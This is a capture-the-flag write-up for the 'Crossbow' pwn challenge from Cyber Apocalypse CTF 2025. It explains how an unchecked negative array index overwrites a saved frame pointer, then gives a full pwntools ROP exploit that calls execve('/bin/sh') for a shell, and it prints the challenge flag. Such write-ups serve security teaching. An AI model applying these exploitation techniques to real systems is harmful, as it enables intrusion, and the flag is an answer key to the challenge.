# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Crossbow
> Sir Alaric's legendary shot can pierce through any enemy! Join his training and hone your aim to match his unparalleled precision.

- **Category**: Pwn 
- **Difficulty**: Easy
- **Author**: Cioppo

## Writeup

Protection:
```bash
> checksec crossbow
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```
The got is writable and we have no PIE!

Let's decompile the two most important functions
```C
__int64 training()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  printf(
    (__int64)"%s\n[%sSir Alaric%s]: You only have 1 shot, don't miss!!\n",
    "\x1B[1;34m",
    "\x1B[1;33m",
    "\x1B[1;34m");
  target_dummy((__int64)v1);
  return printf((__int64)"%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
}
```
And the second:
```C
__int64 __fastcall target_dummy(__int64 a1)
{
  int v1; // edx
  int v2; // ecx
  int v3; // r8d
  int v4; // r9d
  _QWORD *v5; // rbx
  __int64 result; // rax
  int v7; // [rsp+1Ch] [rbp-14h] BYREF

  printf((__int64)"%s\n[%sSir Alaric%s]: Select target to shoot: ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v7, v1, v2, v3, v4) != 1 )
  {
    printf(
      (__int64)"%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
      "\x1B[1;31m",
      "\x1B[1;33m",
      "\x1B[1;31m");
    exit(1312LL);
  }
  v5 = (_QWORD *)(8LL * v7 + a1);
  *v5 = calloc(1LL, 128LL);
  if ( !*v5 )
  {
    printf((__int64)"%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(6969LL);
  }
  printf((__int64)"%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ", "\x1B[1;34m", "\x1B[1;33m", "\x1B[1;34m");
  result = fgets_unlocked(*(_QWORD *)(8LL * v7 + a1), 128LL, &_stdin_FILE);
  if ( !result )
  {
    printf((__int64)"%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(69LL);
  }
  return result;
}
```
they are called like this ``main -> training -> target_dummy``.
We can notice that there are no canaries? (``checksec`` lied to us... :()

Let's focus on this part of the ``target_dummy`` function:
```C
  if ( (unsigned int)scanf((unsigned int)"%d%*c", (unsigned int)&v7, v1, v2, v3, v4) != 1 )
  // ...
  v5 = (_QWORD *)(8LL * v7 + a1);
  *v5 = calloc(1LL, 128LL);
  // ...
  result = fgets_unlocked(*(_QWORD *)(8LL * v7 + a1), 128LL, &_stdin_FILE);
```
Let's rewrite it in a more readable way
```C
  scanf("%d%*c", &v7);
  v5 = &a1[v7*8];
  *v5 = calloc(1, 128);
  fgets(*v5, 128, stdin);
```
We are writing the address given by ``calloc`` at the ``[v7*8]`` position of the array a1 (of size 32 bytes).
This happens because the program doesn't do any kind of input check on the ``v7`` variable, we can even put negative values! (this will be important shortly)

So what can we do with this?
We could rewrite the return address and put a shellcode in ``*v5`` but the heap is not executable! So let's override the frame pointer of the function ``target_dummy`` and start a ROP chain from there, let's calculate the offsets:
```py
pwndbg> stack 20
00:0000│ rsp     0x7fffffffdb70 ◂— 0x0
01:0008│-028     0x7fffffffdb78 —▸ 0x7fffffffdbb0 ◂— 0x0
02:0010│-020     0x7fffffffdb80 ◂— 0x0
03:0018│-018     0x7fffffffdb88 ◂— 0x0
04:0020│-010     0x7fffffffdb90 ◂— 0x1312
05:0028│-008     0x7fffffffdb98 ◂— 0x1
06:0030│ rbp     0x7fffffffdba0 —▸ 0x7fffffffdbd0 —▸ 0x7fffffffdbe0 —▸ 0x7fffffffdc28 —▸ 0x7fffffffdf76 ◂— ...
07:0038│+008     0x7fffffffdba8 —▸ 0x4013b8 (training+74) ◂— lea rax, [rip + 0xa0e9]
08:0040│ rax rdi 0x7fffffffdbb0 ◂— 0x0 # Start of a1
09:0048│+018     0x7fffffffdbb8 —▸ 0x401175 (cls+58) ◂— nop 
0a:0050│+020     0x7fffffffdbc0 —▸ 0x7fffffffdbd0 —▸ 0x7fffffffdbe0 —▸ 0x7fffffffdc28 —▸ 0x7fffffffdf76 ◂— ...
0b:0058│+028     0x7fffffffdbc8 —▸ 0x4011bc (banner+68) ◂— nop 
0c:0060│+030     0x7fffffffdbd0 —▸ 0x7fffffffdbe0 —▸ 0x7fffffffdc28 —▸ 0x7fffffffdf76 ◂— '/home/cioppo/cybersecurity/ctf/CyberApocalypse2025/crossbow/challenge/crossbow'
0d:0068│+038     0x7fffffffdbd8 —▸ 0x40144a (main+93) ◂— mov eax, 0
0e:0070│+040     0x7fffffffdbe0 —▸ 0x7fffffffdc28 —▸ 0x7fffffffdf76 ◂— '/home/cioppo/cybersecurity/ctf/CyberApocalypse2025/crossbow/challenge/crossbow'
0f:0078│+048     0x7fffffffdbe8 —▸ 0x40171f (libc_start_main_stage2+47) ◂— mov edi, eax
10:0080│+050     0x7fffffffdbf0 ◂— 0x0
```
Let take the address of ``a1`` and substract ``rbp``
```py
>>> 0x7fffffffdbb0 - 0x7fffffffdba0
16
```
we need to go ``-16`` from ``a1``, let's so put ``v7 = -2``:
```C
  v5 = &a1[-2*8]; // =-16
  *v5 = calloc(1, 128);
  fgets(*v5, 128, stdin);
```
we can then write our ROP chain in the heap (starting at ``+8`` because ``*v5`` is ``rbp``), we don't have a ``/bin/sh\x00`` string in our binary so we will need to write it somewhere, I chosed ``.bss``.


### Full exploit
---
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./crossbow_patched")

context.binary = exe
context.log_level = "debug"

global r
def conn():
    global r
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path])
    else:
        r = remote("addr", 1337)

    return r

# Gadgets (found with ropr)
SYSCALL = 0x0040ae31
POP_RAX = 0x0040aec5
POP_RDI = 0x0040ac2d
POP_RSI = 0x004069b6
POP_RDX = 0x00401139
WRITE = 0x00402216 # mov [rdi], rax; ret;
BSS = 0x000000000040e220

def main():
    conn()

    # Our ROP chain on the heap
    payload = flat([
        0xdeadbeef, # rbp
        # Write /bin/sh somewhere writable
        POP_RDI,
        BSS,
        POP_RAX,
        b"/bin/sh\x00",
        WRITE,
        # Let's call execve (we already have RDI set)
        POP_RAX,
        0x3b,
        POP_RSI,
        0,
        POP_RDX,
        0,
        SYSCALL
    ])

    # Override the frame pointer of target_dummy and send payload
    r.sendlineafter(b": ", b"-2")
    r.sendlineafter(b"> ", payload)

    # We have the shell!
    r.interactive()

if __name__ == "__main__":
    main()

```

> HTB{st4t1c_b1n4r13s_ar3_2_3z_5ef4829bbd22bac4ca62fa87a57eda7b}